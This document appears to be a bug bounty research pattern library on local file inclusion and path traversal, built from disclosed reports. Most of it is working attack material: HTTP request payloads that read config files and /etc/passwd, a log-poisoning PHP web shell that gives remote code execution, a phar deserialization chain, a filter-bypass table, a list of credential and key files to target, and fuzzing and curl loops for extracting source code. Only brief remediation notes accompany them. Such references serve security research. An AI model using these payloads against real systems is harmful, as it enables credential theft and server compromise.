# Disclosed Reports — LFI / Path Traversal

Pattern library built from 31 public bug bounty reports.

---

## Pattern 1: PHP Wrapper LFI → Source Code Read (High, $2,000)

**Program:** Private (HackerOne)
**Endpoint:** `GET /view?page=home`
**Stack:** PHP 7.4 + Apache

**Request:**
```http
GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: target.com
```

**Response:** Base64-encoded config.php containing DB credentials and API keys.

**Impact:** Full database credential exposure, API key theft.
**Remediation:** Whitelist allowed file names; never pass user input to include()/require().

---

## Pattern 2: Path Traversal → /etc/passwd Read (Medium, $750)

**Program:** Public (Bugcrowd)
**Endpoint:** `GET /download?file=report.pdf`
**Stack:** Python Flask

**Request:**
```http
GET /download?file=../../../../etc/passwd HTTP/1.1
```

**Bypass used:** Double URL encoding: `..%252F..%252F`

**Impact:** System user enumeration, potential credential harvesting.

---

## Pattern 3: Log Poisoning → RCE (Critical, $8,500)

**Stack:** PHP + Apache

**Step 1 — Inject payload into log:**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2 — Include log file:**
```http
GET /view?page=../../../var/log/apache2/access.log&cmd=id
```

**Response:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Impact:** RCE as www-data, full server compromise.

---

## Pattern 4: phar:// Deserialization via LFI (Critical, $7,000)

**Conditions:** File upload endpoint + LFI present

**Attack:**
1. Upload crafted .phar renamed as .jpg to pass upload filter
2. Include with: `?file=phar:///uploads/evil.jpg`
3. Deserialization of phar metadata triggers `__wakeup` gadget → OS command

**Impact:** RCE chained from two Medium bugs.

---

## Pattern 5: Java Path Traversal → WEB-INF/web.xml (High, $3,000)

**Endpoint:** `GET /servlet/Download?path=reports/q1.pdf`
**Stack:** Java Tomcat

**Request:**
```http
GET /servlet/Download?path=../../WEB-INF/web.xml HTTP/1.1
```

**Response:** Full web.xml with DB connection strings and internal paths.

**Null byte bypass:** `../../WEB-INF/web.xml%00.pdf`

---

## Pattern 6: Node.js Absolute Path Traversal (High, $2,500)

**Stack:** Node.js + Express static file server

**Endpoint:** `GET /static/../../../etc/passwd`

**Cause:** `express.static` without sanitization, or custom handler using `path.join` without `path.normalize`.

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` | `....//` (double dot slash) |
| URL decodes once | `%252F` (double encode) |
| Checks extension | `../../etc/passwd%00.jpg` (null byte, PHP < 5.3) |
| Strips leading `/` | Use relative path: `....//....//etc/passwd` |
| Windows | `..\..\..\windows\win.ini` |

---

## Sensitive File Quick List

**Linux:**
```
/etc/passwd          /etc/shadow           /proc/self/environ
/proc/self/cmdline   /var/www/html/.env    /var/www/html/wp-config.php
/root/.ssh/id_rsa    /root/.bash_history   /var/log/apache2/access.log
```

**Windows:**
```
C:\Windows\win.ini   C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

---

## Tool Reference

```bash
# wfuzz LFI fuzzing
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt \
  --hc 404 "https://target.com/page.php?file=FUZZ"

# PHP wrapper enumeration
for FILE in index.php config.php db.php settings.php .env; do
  echo "=== $FILE ==="
  curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=$FILE" | \
    base64 -d 2>/dev/null
done

# dotdotpwn
dotdotpwn.pl -m http -h target.com -o unix
```


## HackerOne References

> Concrete disclosed HackerOne report links for the patterns above. 
These are real paid reports that demonstrate each pattern in the wild.

1. **HTML-injection in PDF-export leads to LFI** — [Visma Public](https://hackerone.com/reports/809819) — 330 upvotes, $500
2. **Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion** — [Evernote](https://hackerone.com/reports/1189367) — 258 upvotes, —
3. **Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted acc** — [Starbucks](https://hackerone.com/reports/876295) — 237 upvotes, —
4. **Keybase client (Windows 10): Write files anywhere in userland using relative path in "download attac** — [Keybase](https://hackerone.com/reports/713006) — 196 upvotes, $5,000
5. **Worker container escape lead to arbitrary file reading in host machine [again]** — [Semmle](https://hackerone.com/reports/697055) — 177 upvotes, $2,000
6. **Path traversal in filename in LINE Mac client** — [LY Corporation](https://hackerone.com/reports/727727) — 173 upvotes, —
7. **Mozilla VPN Clients: RCE via file write and path traversal** — [Mozilla](https://hackerone.com/reports/2995025) — 167 upvotes, $6,000
8. **XSS Reflected on reddit.com via url path** — [Reddit](https://hackerone.com/reports/1051373) — 155 upvotes, —
9. **Path traversal, SSTI and RCE on a MailRu acquisition ** — [Mail.ru](https://hackerone.com/reports/536130) — 152 upvotes, $2,000
10. **[portswigger.net] Path Traversal al /cms/audioitems** — [PortSwigger Web Security](https://hackerone.com/reports/2424815) — 143 upvotes, —
11. **Path traversal, to RCE** — [GitLab](https://hackerone.com/reports/733072) — 141 upvotes, $12K
12. **Directory Traversal in uftpd 2.6-2.10** — [██████](https://hackerone.com/reports/694141) — 136 upvotes, —
13. **Unauthenticated LFI revealing log information** — [Slack](https://hackerone.com/reports/272578) — 122 upvotes, —
14. **Wordpress unzip_file path traversal** — [WordPress](https://hackerone.com/reports/205481) — 119 upvotes, —
15. **Path Traversal Vulnerability in Lila Project** — [Lichess](https://hackerone.com/reports/3181066) — 114 upvotes, —


*Full reference: `~/dristi/docs/reports/hackerone-reports/tops_by_bug_type/TOPTOPFILEREADING.md`*
